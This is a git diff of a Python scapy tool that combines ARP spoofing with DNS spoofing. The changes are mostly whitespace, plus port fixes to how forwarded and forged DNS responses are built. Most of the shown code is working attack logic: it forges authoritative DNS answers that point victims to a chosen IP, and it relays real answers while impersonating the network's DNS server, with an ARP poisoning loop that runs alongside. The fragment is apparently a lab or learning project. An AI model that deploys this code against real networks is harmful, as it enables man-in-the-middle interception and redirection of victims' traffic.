@@ -76,8 +76,8 @@ class ArpSpoofer(object):
         """
         Main loop of the process.
         """
-        while self.spoof_count < 100: # todo remove this after debugging
-        # while True:
+        while self.spoof_count < 100:  # todo remove this after debugging
+            # while True:
             self.spoof()
             time.sleep(SPOOF_SLEEP_TIME)
 
@@ -114,7 +114,6 @@ class DnsHandler(object):
         self.spoof_dict = spoof_dict
         self.real_dns_server_ip = REAL_DNS_SERVER_IP
 
-
     def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
         """
         Returns the real DNS response to the given DNS request.
@@ -127,7 +126,7 @@ class DnsHandler(object):
         print("DNSing")
         # Create a new IP packet to send to the DNS server
         ip = IP(dst='8.8.8.8')
-        udp = UDP(dport=53)
+        udp = UDP(sport=33233, dport=53)
 
         # Forward the original DNS query to the real DNS server
         dns_req = ip / udp / pkt[DNS]
@@ -139,12 +138,12 @@ class DnsHandler(object):
             dns_resp[IP].src = NETWORK_DNS_SERVER_IP
             dns_resp[IP].dst = pkt[IP].src
             dns_resp[UDP].dport = pkt[UDP].sport
+            dns_resp[UDP].sport = pkt[UDP].dport
             print(dns_resp)
             return dns_resp
         else:
             print("No response from DNS server.")
             return None
-
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
         """
@@ -162,13 +161,11 @@ class DnsHandler(object):
         transaction_id = pkt[DNS].id  # Transaction ID
         query_name = pkt[DNS].qd.qname  # Query name
 
-
         response_pkt = IP(src=ip_src, dst=ip_dst) / \
                        UDP(sport=port_src, dport=port_dst) / \
                        DNS(id=transaction_id, qr=1, aa=1, qd=pkt[DNS].qd,
                            an=DNSRR(rrname=query_name, ttl=300, rdata=to))
         return response_pkt
-
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
         """
@@ -201,7 +198,6 @@ class DnsHandler(object):
             response_pkt.show()
             scapy.send(response_pkt)
 
-
     def run(self) -> None:
         """
         Main loop of the process. Sniffs for packets on the interface and sends DNS
@@ -214,7 +210,6 @@ class DnsHandler(object):
             except:
                 import traceback
                 traceback.print_exc()
-
 
     def start(self) -> None:
         """
